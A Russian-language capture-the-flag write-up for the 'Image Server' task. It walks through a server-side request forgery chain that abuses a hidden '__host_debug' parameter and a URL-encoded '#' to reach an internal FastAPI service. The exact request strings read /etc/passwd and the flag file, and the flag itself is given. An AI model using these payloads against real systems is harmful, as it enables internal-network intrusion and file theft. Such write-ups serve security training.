# Image Server
При открытии страницы происходит запрос к `/api/image?img_id=5`. Повторив этот запрос без значения параметра получаем ошибку, в которой раскрываются значения переменных окружения, среди которых интересные это IMG_SERVER=imghost:8080 и OLD_SERVER=oldserver:8000.
А так же форматная строка подготавливающая запрос 
``` python
r = requests.get(f'http://{request.args.get("__host_debug") if "__host_debug" in request.args else IMG_SERVER}/get_image/{int(img_id)}')
```
из которой можем узнать что проверяется еще один параметр `__host_debug` который подставляется в запрос, если указан.

В burp repeater подставляем значение OLD_SERVER в значение параметра `__host_debug` и добавляем символ решетки закодированный в URL в конце параметра, чтобы отбросить `/get_image/<id>`.

Запрос - `/api/image?img_id=0&__host_debug=oldserver:8000/%23`
Ответ - `{"message":"OK","RUN_WITH":"FastAPI"}`.

Из документации узнаем что есть `/docs`
Запрос - `/api/image?img_id=0&__host_debug=oldserver:8000/docs%23`
Видим что javascript на этой странице запрашивает `/openapi.json`.

Запрос - `/api/image?img_id=0&__host_debug=oldserver:8000/openapi.json%23`
В ответе получаем JSON с описанием api. Из него узнаем что есть `/test_endpoint` который может принимать строковый параметр `fname` и возвращает JSON с параметром `content` и содержимым файла.

Запрос - `/api/image?img_id=0&__host_debug=oldserver:8000/test_endpoint?fname=/etc/passwd%23`
В ответе узнаем список пользователей, в данном случае есть каталог `/home/flag`.

Запрос - `/api/image?img_id=0&__host_debug=oldserver:8000/test_endpoint?fname=/home/flag/flag.txt%23`.
Получаем содержимое файла flag.txt 

Флаг - deteact{4a4db41eacd762e1b0bc2f303326df91}